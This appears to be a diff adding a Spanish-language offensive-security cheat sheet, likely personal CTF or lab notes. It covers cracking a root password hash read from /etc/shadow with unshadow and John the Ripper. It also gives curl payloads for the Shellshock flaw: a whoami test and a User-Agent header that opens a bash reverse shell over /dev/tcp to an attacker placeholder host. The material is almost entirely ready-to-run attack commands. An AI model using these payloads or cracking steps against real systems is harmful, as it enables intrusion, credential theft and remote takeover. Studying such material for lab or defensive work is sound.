@@ -1,0 +1,32 @@
+* SI ES QUE SE PUEDE LEER EL etc/shadow
+▶ Para crackear contraseñas de una máquina víctima si es posible leer /etc/shadow
+  # /etc/passwd line
+  root:x:0:0:root:/root:/bin/bash
+
+  # /etc/shadow line
+  root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::
+  
+  # --- Copiar ambos en arvhiso distintos ---
+
+▶ Para ensamblar los dos archivos debemos ejecutar:
+  unshadow passwd.txt shadow.txt > unshadowed.txt
+
+▶ Que almacenará en el archivo unshadowed.txt lo siguiente:
+  root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:0:0:root:/root:/bin/bash
+
+▶ Procede a crackear con John:
+  john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+* EXPLOTACIÓN DE VULNERABILIDAD SHELLSHOCK
+▶ Detección (Prueba de concepto):
+  # Si el servidor es vulnerable, ejecutará el comando /usr/bin/whoami y
+  # devolverá el resultado en la respuesta HTTP.
+  curl -s -X GET "http://$IP/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+
+▶ Explotación (RevShell)
+  # Si se observa que el comando lanzado muestra un resultado, podemos
+  # realizar una reverse shell:
+  curl -s -X GET "http://$IP/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1"
+
+▶ Referencias:
+  https://ine.com/blog/shockin-shells-shellshock-cve-2014-6271
